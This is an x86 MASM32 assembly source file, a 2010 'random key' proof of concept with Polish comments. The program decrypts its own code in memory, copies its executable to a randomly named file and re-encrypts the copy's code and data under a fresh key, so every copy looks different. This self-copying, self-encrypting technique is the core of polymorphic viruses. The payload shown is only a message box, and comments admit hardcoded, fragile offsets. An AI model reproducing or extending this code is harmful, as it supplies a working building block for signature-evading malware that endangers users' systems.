.486
.model flat, stdcall
option casemap :none
public start

;------------------------------
;  Encrypted copyZ of File
;     :random key poc
;           by
;        ~~echo~~ 
;     5.10.2010 05:44
;------------------------------

include    C:\masm32\include\windows.inc
include    C:\masm32\include\kernel32.inc
includelib C:\masm32\lib\kernel32.lib 
include    C:\masm32\include\user32.inc
includelib C:\masm32\lib\user32.lib

.data?
 oldProtect   dd ?
 newKey       dd ?
                        
.const
 assume cs:nothing
 cSize equ (eRRor - crypt) / 4
 dSize equ (dCryptEnd - dCrypt) / 4
 
 Decryptor proc place:ptr dword,sizeX:ptr dword

              mov ecx,sizeX;dSize
              mov esi,place;dCrypt
              mov edi,dword ptr [codeKey]
              mov edx,edi
              _for:
                   xor  dword ptr [esi],edi
                   ror  edx,1
                   add  dword ptr [esi],edx
                   add  esi,4
              loop _for 
              ret
              
 Decryptor endp  

.data 
 assume cs:nothing
 codeKey:
         dd 00000000h
 dCrypt:      
 db "-~~-",0                                               ;<- data marker  
 randFileName   db MAX_PATH + 2 dup(0)    
 moduleFileName db MAX_PATH + 2 dup(0)   
 extend         db "exe",0    
 prefix         db "zuo",0           
 goodbyeWorld   db "Hello hello can...",0
 helloTitle     db "matrix has you !!!!",0                                                

 Encryptor proc place:ptr dword,sizeX:ptr dword,keyX:ptr dword

              mov ecx,sizeX
              mov esi,place
              mov edi,keyX
              mov edx,edi
              _for:
                   ror  edx,1
                   sub  dword ptr [esi],edx 
                   xor  dword ptr [esi],edi
                   add  esi,4
              loop _for
              ret
              
 Encryptor endp

 createFileName proc
 
                push ebp
                mov  ebp,esp
                sub  esp,MAX_PATH + 4

                lea  ebx, [ebp - MAX_PATH + 4]
                push ebx
                push MAX_PATH
                call near ptr GetCurrentDirectory

                call near ptr GetTickCount
                push offset randFileName
                push eax
                push offset prefix
                push ebx
                call near ptr GetTempFileName

                push offset randFileName
                call near ptr lstrlen
                test eax,eax
                je short _error
                mov  ebx,offset randFileName
                add  ebx,eax
                sub  ebx,3
                mov  edi,ebx
                mov  eax,dword ptr [extend]
                stosd
                mov eax,0
                jmp short _noError
                 
                _error:
                mov eax,-1
                _noError:
                mov esp,ebp
                pop ebp 
                ret

 createFileName endp
 
 dCryptEnd:


.code 

 start:                                                          
         push offset oldProtect 
         push 040h
         push cSize
         push offset crypt
         call VirtualProtect
         push offset dSize
         push dCrypt 
         call Decryptor
         push offset cSize
         push crypt
         call Decryptor
         jmp  ccode
         
         crypt: 
               db "-==-",0                                          ;<- clear code marker
               ccode:
                     call GetTickCount
                     shl  eax,3
                     mov  newKey,eax
                     call createFileName                              ;<- losowa nazwa pliku

                     push MAX_PATH
                     push offset moduleFileName
                     push 0
                     call GetModuleFileName                           ;<- scie¿ka do naszego progsa

                     push 0
                     push offset randFileName
                     push offset moduleFileName
                     call CopyFile                                    ;<- kopiujemy

                     push 0
                     push 0
                     push OPEN_EXISTING
                     push 0
                     push FILE_SHARE_READ or FILE_SHARE_WRITE
                     push GENERIC_READ or GENERIC_WRITE
                     push offset randFileName
                     call CreateFile
                     cmp  eax,INVALID_HANDLE_VALUE
                     je   eRRor
                     push eax                                          ;<- safe handler

                     push 0
                     push 0
                     push 0 
                     push PAGE_READWRITE
                     push 0
                     push eax
                     call CreateFileMapping
                     test eax,eax
                     je   closeHandleOne                           
                     push eax                                          ;<- safe handler two 
                     
                     push 0
                     push 0
                     push 0
                     push FILE_MAP_ALL_ACCESS
                     push eax
                     call MapViewOfFile                                 ;<- ok mamy mape kopi 
                     test eax,eax
                     je   closeHandleTwo 
                     push eax                                           ;<- zachowaj uchwyt
                                                                        ;<- address danych w obrazie
                     mov  esi,eax;                                      ;<- offset = start - codeKey to hex + ...
                     add  si,0804h                                      ;<- ... we n33d full automatic 
                  
                     cmp  dword ptr [esi],"-~~-"                         ;<- czy plik jest czysty
                     push esi
                     je   EncryptData                                   ;<- kopia jest zaszyfrowana 
                     push offset dSize
                     push esi 
                     call Decryptor
                     
                     EncryptData:
                                 pop esi
                                 push dword ptr [newKey]
                                 push offset dSize
                                 push esi
                                 call Encryptor
                   
                     mov esi,eax                                         ;<- aderess codu w obrazie 
                     mov edi,crypt - start                               ;<- m³odsze dwie czêsci edi maj± offset 400h (dziesiêtnie) napisz konwerter dec2hex zmien resjestry i dodaj si do eax voila !
                     add esi,0400h                                       ;<- ... yeaph full auto we n33d byt its 04:29 
                     add esi,edi    
                     push esi

                     cmp dword ptr [esi],"-==-"
                     je  EncryptCode
                     push offset cSize
                     push esi
                     call Decryptor

                     EncryptCode:
                                 pop esi
                                 push dword ptr [newKey]
                                 push offset cSize
                                 push esi
                                 call Encryptor
                                 
                                 mov  edi,dword ptr [newKey]
                                 mov  dword ptr[eax + 0800h],edi                        ;<-- we need auto lol hehehehehe

                     push 0
                     push offset goodbyeWorld
                     push offset helloTitle
                     push 0
                     call MessageBox 
                                    
                     call UnmapViewOfFile
                     call CloseHandle
                     call CloseHandle
                                       
                     jmp  eRRor                                        

         closeHandleOne:            
                        call CloseHandle
                        jmp  eRRor
         closeHandleTwo:
                        call CloseHandle;
                        call CloseHandle;
         eRRor:
                push 0
                call ExitProcess 
         end eRRor
               ;...
         end crypt
 end start